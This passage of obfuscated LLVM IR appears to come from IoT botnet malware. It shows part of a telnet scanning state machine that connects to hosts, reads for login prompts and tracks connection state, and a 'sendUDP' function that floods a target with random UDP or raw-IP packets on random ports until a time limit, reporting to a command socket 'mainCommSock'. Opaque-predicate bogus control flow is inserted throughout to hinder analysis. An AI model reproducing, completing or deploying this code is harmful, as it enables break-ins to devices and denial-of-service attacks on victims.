  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 0
  %1502 = load i32, i32* %1501, align 16
  %1503 = load i32, i32* %2, align 4
  %1504 = sext i32 %1503 to i64
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1504
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1505, i32 0, i32 0
  %1507 = load i32, i32* %1506, align 16
  %1508 = call i32 (i32, i32, ...) @fcntl(i32 %1507, i32 3, i8* null)
  %_28 = shl i32 %1508, 2048
  %_29 = sub i32 0, %1508
  %gen = add i32 %_29, 2048
  %_30 = sub i32 0, %1508
  %gen31 = add i32 %_30, 2048
  %_32 = sub i32 %1508, 2048
  %gen33 = mul i32 %_32, 2048
  %1509 = or i32 %1508, 2048
  %1510 = call i32 (i32, i32, ...) @fcntl(i32 %1502, i32 4, i32 %1509)
  %1511 = load i32, i32* %2, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1512
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1513, i32 0, i32 0
  %1515 = load i32, i32* %1514, align 16
  %1516 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %1517 = call i32 @connect(i32 %1515, %struct.sockaddr* %1516, i32 16)
  %1518 = icmp eq i32 %1517, -1
  br label %originalBB27

originalBB37alteredBB:                            ; preds = %originalBB37, %335
  %1519 = call i32* @__errno_location() #13
  %1520 = load i32, i32* %1519, align 4
  %1521 = icmp ne i32 %1520, 115
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %376
  %1522 = load i32, i32* %2, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 6
  %1526 = load i32, i32* %1525, align 4
  %1527 = icmp eq i32 %1526, 0
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %523
  %1528 = load i32, i32* %2, align 4
  %1529 = sext i32 %1528 to i64
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1529
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1530, i32 0, i32 6
  %1532 = load i32, i32* %1531, align 4
  %_46 = sub i32 0, %1532
  %gen47 = add i32 %_46, 5
  %_48 = sub i32 0, %1532
  %gen49 = add i32 %_48, 5
  %_50 = sub i32 0, %1532
  %gen51 = add i32 %_50, 5
  %_52 = sub i32 0, %1532
  %gen53 = add i32 %_52, 5
  %1533 = add i32 %1532, 5
  %1534 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1535 = icmp ult i32 %1533, %1534
  br label %originalBB45

originalBB57alteredBB:                            ; preds = %originalBB57, %548
  %1536 = load i32, i32* %2, align 4
  %1537 = sext i32 %1536 to i64
  %1538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1537
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1538, i32 0, i32 0
  %1540 = load i32, i32* %1539, align 16
  %1541 = call i32 @sclose(i32 %1540)
  %1542 = load i32, i32* %2, align 4
  %1543 = sext i32 %1542 to i64
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1543
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1544, i32 0, i32 2
  store i8 0, i8* %1545, align 8
  %1546 = load i32, i32* %2, align 4
  %1547 = sext i32 %1546 to i64
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1547
  %1549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1548, i32 0, i32 3
  store i8 1, i8* %1549, align 1
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %587
  %1550 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1551 = load i32, i32* %2, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1552
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1553, i32 0, i32 6
  store i32 %1550, i32* %1554, align 4
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %680
  %1555 = load i32, i32* %2, align 4
  %1556 = sext i32 %1555 to i64
  %1557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1556
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1557, i32 0, i32 0
  %1559 = load i32, i32* %1558, align 16
  %1560 = call i32 @sclose(i32 %1559)
  %1561 = load i32, i32* %2, align 4
  %1562 = sext i32 %1561 to i64
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1562
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1563, i32 0, i32 2
  store i8 0, i8* %1564, align 8
  %1565 = load i32, i32* %2, align 4
  %1566 = sext i32 %1565 to i64
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1566
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1567, i32 0, i32 3
  store i8 1, i8* %1568, align 1
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %737
  %1569 = load i32, i32* %2, align 4
  %1570 = sext i32 %1569 to i64
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1570
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1571, i32 0, i32 0
  %1573 = load i32, i32* %1572, align 16
  %1574 = call i32 @sclose(i32 %1573)
  %1575 = load i32, i32* %2, align 4
  %1576 = sext i32 %1575 to i64
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1576
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1577, i32 0, i32 2
  store i8 0, i8* %1578, align 8
  %1579 = load i32, i32* %2, align 4
  %1580 = sext i32 %1579 to i64
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 3
  store i8 1, i8* %1582, align 1
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %776
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 0
  %1587 = load i32, i32* %1586, align 16
  %1588 = call i32 @sclose(i32 %1587)
  %1589 = load i32, i32* %2, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 2
  store i8 0, i8* %1592, align 8
  %1593 = load i32, i32* %2, align 4
  %1594 = sext i32 %1593 to i64
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1594
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1595, i32 0, i32 3
  store i8 1, i8* %1596, align 1
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %819
  %1597 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1598 = load i32, i32* %2, align 4
  %1599 = sext i32 %1598 to i64
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1599
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1600, i32 0, i32 6
  store i32 %1597, i32* %1601, align 4
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %841
  %1602 = load i32, i32* %2, align 4
  %1603 = sext i32 %1602 to i64
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1603
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1604, i32 0, i32 0
  %1606 = load i32, i32* %1605, align 16
  %1607 = load i32, i32* %2, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 8
  %1611 = load i8*, i8** %1610, align 8
  %1612 = load i32, i32* %2, align 4
  %1613 = sext i32 %1612 to i64
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1613
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1614, i32 0, i32 7
  %1616 = load i16, i16* %1615, align 16
  %1617 = zext i16 %1616 to i32
  %1618 = call i32 @readUntil(i32 %1606, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1611, i32 1024, i32 %1617)
  %1619 = icmp ne i32 %1618, 0
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %897
  %1620 = load i32, i32* %2, align 4
  %1621 = sext i32 %1620 to i64
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1621
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1622, i32 0, i32 2
  store i8 7, i8* %1623, align 8
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %918
  %1624 = load i32, i32* %2, align 4
  %1625 = sext i32 %1624 to i64
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1625
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1626, i32 0, i32 8
  %1628 = load i8*, i8** %1627, align 8
  call void @llvm.memset.p0i8.i64(i8* %1628, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %984
  %1629 = load i32, i32* %2, align 4
  %1630 = sext i32 %1629 to i64
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1630
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1631, i32 0, i32 0
  %1633 = load i32, i32* %1632, align 16
  %1634 = call i32 @sclose(i32 %1633)
  %1635 = load i32, i32* %2, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1636
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1637, i32 0, i32 2
  store i8 0, i8* %1638, align 8
  %1639 = load i32, i32* %2, align 4
  %1640 = sext i32 %1639 to i64
  %1641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1640
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1641, i32 0, i32 3
  store i8 1, i8* %1642, align 1
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %1041
  %1643 = load i32, i32* %2, align 4
  %1644 = sext i32 %1643 to i64
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1644
  %1646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1645, i32 0, i32 0
  %1647 = load i32, i32* %1646, align 16
  %1648 = call i32 @sclose(i32 %1647)
  %1649 = load i32, i32* %2, align 4
  %1650 = sext i32 %1649 to i64
  %1651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1650
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1651, i32 0, i32 2
  store i8 0, i8* %1652, align 8
  %1653 = load i32, i32* %2, align 4
  %1654 = sext i32 %1653 to i64
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1654
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1655, i32 0, i32 3
  store i8 1, i8* %1656, align 1
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %1072
  %1657 = load i32, i32* %2, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 0
  %1661 = load i32, i32* %1660, align 16
  %1662 = call i64 @send(i32 %1661, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.28, i32 0, i32 0), i64 2, i32 16384)
  %1663 = icmp slt i64 %1662, 0
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %1129
  %1664 = load i32, i32* %2, align 4
  %1665 = sext i32 %1664 to i64
  %1666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1665
  %1667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1666, i32 0, i32 0
  %1668 = load i32, i32* %1667, align 16
  %1669 = load i32, i32* %2, align 4
  %1670 = sext i32 %1669 to i64
  %1671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1670
  %1672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1671, i32 0, i32 8
  %1673 = load i8*, i8** %1672, align 8
  %1674 = load i32, i32* %2, align 4
  %1675 = sext i32 %1674 to i64
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1675
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1676, i32 0, i32 7
  %1678 = load i16, i16* %1677, align 16
  %1679 = zext i16 %1678 to i32
  %1680 = call i32 @readUntil(i32 %1668, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1673, i32 1024, i32 %1679)
  %1681 = icmp ne i32 %1680, 0
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %1200
  %1682 = load i32, i32* %2, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1683
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1684, i32 0, i32 8
  %1686 = load i8*, i8** %1685, align 8
  %1687 = call i32 @matchPrompt(i8* %1686)
  %1688 = icmp ne i32 %1687, 0
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %1224
  %1689 = load i32, i32* %2, align 4
  %1690 = sext i32 %1689 to i64
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1690
  %1692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1691, i32 0, i32 8
  %1693 = load i8*, i8** %1692, align 8
  call void @llvm.memset.p0i8.i64(i8* %1693, i8 0, i64 1024, i32 1, i1 false)
  %1694 = load i32, i32* %2, align 4
  %1695 = sext i32 %1694 to i64
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1695
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1696, i32 0, i32 0
  %1698 = load i32, i32* %1697, align 16
  %1699 = call i32 @sclose(i32 %1698)
  %1700 = load i32, i32* %2, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1701
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1702, i32 0, i32 2
  store i8 0, i8* %1703, align 8
  %1704 = load i32, i32* %2, align 4
  %1705 = sext i32 %1704 to i64
  %1706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1705
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1706, i32 0, i32 3
  store i8 1, i8* %1707, align 1
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %1260
  %1708 = load i32, i32* %2, align 4
  %1709 = sext i32 %1708 to i64
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1709
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1710, i32 0, i32 2
  store i8 7, i8* %1711, align 8
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %1332
  %1712 = load i32, i32* %2, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1713
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1714, i32 0, i32 0
  %1716 = load i32, i32* %1715, align 16
  %1717 = call i32 @sclose(i32 %1716)
  %1718 = load i32, i32* %2, align 4
  %1719 = sext i32 %1718 to i64
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1719
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1720, i32 0, i32 2
  store i8 0, i8* %1721, align 8
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 3
  store i8 1, i8* %1725, align 1
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %1435
  %1726 = load i32, i32* %2, align 4
  %_126 = sub i32 %1726, 1
  %gen127 = mul i32 %_126, 1
  %_128 = sub i32 %1726, 1
  %gen129 = mul i32 %_128, 1
  %1727 = add nsw i32 %1726, 1
  store i32 %1727, i32* %2, align 4
  br label %originalBB125
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %51

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* @x.65
  %33 = load i32, i32* @y.66
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = call i32 @rand_cmwc()
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = load i32, i32* @x.65
  %44 = load i32, i32* @y.66
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %56

; <label>:51:                                     ; preds = %6
  %52 = load i32, i32* %8, align 4
  %53 = trunc i32 %52 to i16
  %54 = call zeroext i16 @htons(i16 zeroext %53) #13
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %54, i16* %55, align 2
  br label %56

; <label>:56:                                     ; preds = %51, %originalBBpart2
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %59 = call i32 @getHost(i8* %57, %struct.in_addr* %58)
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %56
  br label %461

; <label>:62:                                     ; preds = %56
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %64 = getelementptr inbounds [8 x i8], [8 x i8]* %63, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 8, i32 4, i1 false)
  %65 = load i32, i32* %12, align 4
  store i32 %65, i32* %14, align 4
  %66 = load i32, i32* %10, align 4
  %67 = icmp eq i32 %66, 32
  br i1 %67, label %68, label %184

; <label>:68:                                     ; preds = %62
  %69 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %69, i32* %15, align 4
  %70 = load i32, i32* %15, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %75, label %72

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @mainCommSock, align 4
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %73, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.33, i32 0, i32 0))
  br label %461

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* @x.65
  %77 = load i32, i32* @y.66
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  %84 = load i32, i32* %11, align 4
  %85 = add nsw i32 %84, 1
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #2
  store i8* %87, i8** %16, align 8
  %88 = load i8*, i8** %16, align 8
  %89 = icmp eq i8* %88, null
  %90 = load i32, i32* @x.65
  %91 = load i32, i32* @y.66
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %89, label %98, label %99

; <label>:98:                                     ; preds = %originalBBpart24
  br label %461

; <label>:99:                                     ; preds = %originalBBpart24
  %100 = load i32, i32* @x.65
  %101 = load i32, i32* @y.66
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %99
  %108 = load i8*, i8** %16, align 8
  %109 = load i32, i32* %11, align 4
  %110 = add nsw i32 %109, 1
  %111 = sext i32 %110 to i64
  call void @llvm.memset.p0i8.i64(i8* %108, i8 0, i64 %111, i32 1, i1 false)
  %112 = load i8*, i8** %16, align 8
  %113 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %112, i32 %113)
  %114 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %115 = load i32, i32* %9, align 4
  %116 = add nsw i32 %114, %115
  store i32 %116, i32* %17, align 4
  store i32 0, i32* %18, align 4
  %117 = load i32, i32* @x.65
  %118 = load i32, i32* @y.66
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart228, label %originalBB6alteredBB

originalBBpart228:                                ; preds = %originalBB6
  br label %125

; <label>:125:                                    ; preds = %180, %originalBBpart236, %originalBBpart228
  %126 = load i32, i32* %15, align 4
  %127 = load i8*, i8** %16, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %131 = call i64 @sendto(i32 %126, i8* %127, i64 %129, i32 0, %struct.sockaddr* %130, i32 16)
  %132 = load i32, i32* %18, align 4
  %133 = load i32, i32* %14, align 4
  %134 = icmp eq i32 %132, %133
  br i1 %134, label %135, label %180

; <label>:135:                                    ; preds = %125
  %136 = load i32, i32* %8, align 4
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %158

; <label>:138:                                    ; preds = %135
  %139 = load i32, i32* @x.65
  %140 = load i32, i32* @y.66
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %138
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %148, i16* %149, align 2
  %150 = load i32, i32* @x.65
  %151 = load i32, i32* @y.66
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %158

; <label>:158:                                    ; preds = %originalBBpart232, %135
  %159 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %160 = load i32, i32* %17, align 4
  %161 = icmp sgt i32 %159, %160
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158
  br label %183

; <label>:163:                                    ; preds = %158
  %164 = load i32, i32* @x.65
  %165 = load i32, i32* @y.66
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %163
  store i32 0, i32* %18, align 4
  %172 = load i32, i32* @x.65
  %173 = load i32, i32* @y.66
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %125

; <label>:180:                                    ; preds = %125
  %181 = load i32, i32* %18, align 4
  %182 = add i32 %181, 1
  store i32 %182, i32* %18, align 4
  br label %125

; <label>:183:                                    ; preds = %162
  br label %461

; <label>:184:                                    ; preds = %62
  %185 = load i32, i32* @x.65
  %186 = load i32, i32* @y.66
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %184
  %193 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %193, i32* %19, align 4
  %194 = load i32, i32* %19, align 4
  %195 = icmp ne i32 %194, 0
  %196 = load i32, i32* @x.65
  %197 = load i32, i32* @y.66
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %195, label %207, label %204

; <label>:204:                                    ; preds = %originalBBpart240
  %205 = load i32, i32* @mainCommSock, align 4
  %206 = call i32 (i32, i8*, ...) @sockprintf(i32 %205, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.33, i32 0, i32 0))
  br label %461

; <label>:207:                                    ; preds = %originalBBpart240
  store i32 1, i32* %20, align 4
  %208 = load i32, i32* %19, align 4
  %209 = bitcast i32* %20 to i8*
  %210 = call i32 @setsockopt(i32 %208, i32 0, i32 3, i8* %209, i32 4) #2
  %211 = icmp slt i32 %210, 0
  br i1 %211, label %212, label %231

; <label>:212:                                    ; preds = %207
  %213 = load i32, i32* @x.65
  %214 = load i32, i32* @y.66
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %212
  %221 = load i32, i32* @mainCommSock, align 4
  %222 = call i32 (i32, i8*, ...) @sockprintf(i32 %221, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.34, i32 0, i32 0))
  %223 = load i32, i32* @x.65
  %224 = load i32, i32* @y.66
